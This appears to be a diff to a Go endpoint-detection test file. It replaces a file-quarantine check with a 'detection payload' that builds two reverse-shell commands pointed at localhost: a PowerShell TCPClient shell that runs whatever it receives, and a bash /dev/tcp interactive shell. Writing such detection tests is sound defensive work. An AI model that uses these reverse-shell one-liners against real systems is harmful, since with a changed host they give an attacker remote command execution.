+++ tests/c521b330-70eb-4c4d-b748-a8869a7bac4c/c521b330-70eb-4c4d-b748-a8869a7bac4c.go
@@ -1,38 +1,38 @@
 /*
 NAME: c521b330-70eb-4c4d-b748-a8869a7bac4c.go
-RULE: Malicious files are quarantined
-CREATED: 2023-01-03
+RULE: Golang detection payload
+CREATED: 2023-01-05 08:33:41.322000
 */
 package main
 
 import (
-	_ "embed"
+	"fmt"
 	"os"
-
-	Endpoint "github.com/preludeorg/test/endpoint"
+	"os/exec"
+	"runtime"
 )
 
-//go:embed malicious.go
-var malicious []byte
+func check(err error) {
+	if err != nil {
+		fmt.Println(err)
+	}
+}
 
 func test() {
-	println("[+] Dropping file for quarantine test")
-	if Endpoint.Quarantined("malicious", malicious) {
-		os.Exit(105)
+	if runtime.GOOS == "windows" {
+		mal := "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+		exec.Command("powershell.exe", mal)
+	} else {
+		mal := "bash -i >& /dev/tcp/127.0.0.1/40000 0>&1"
+		exec.Command("/bin/bash", "-c", mal)
 	}
-	os.Exit(100)
 }
 
 func clean() {
-	status := Endpoint.Remove("malicious")
-	os.Exit(status)
+	fmt.Println("Cleaned")
+	os.Exit(100)
 }
 
 func main() {
-	args := os.Args[1:]
-	if len(args) > 0 {
-		clean()
-	} else {
-		test()
-	}
+	test()
 }
